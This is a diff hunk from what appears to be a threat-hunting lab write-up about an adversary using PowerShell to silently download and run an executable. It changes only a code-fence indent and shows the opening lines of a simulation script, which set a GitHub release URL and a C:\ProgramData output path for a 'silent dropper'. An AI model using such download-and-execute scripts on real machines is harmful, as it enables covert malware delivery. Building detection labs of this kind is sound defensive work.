@@ -29,7 +29,7 @@ If an adversary abused PowerShell to download and silently execute an `.exe` fro
 
 ## 4. Actions Performed
 1. **Simulation:**
-   ```powershell
+```powershell
 # Lab script using GitHub release URL
 $uri = "https://github.com/charliecash310/silent-dropper-lab/releases/download/v1.0/7z2501-x64.exe"
 $out = "C:\ProgramData\7z2408-x64.exe"
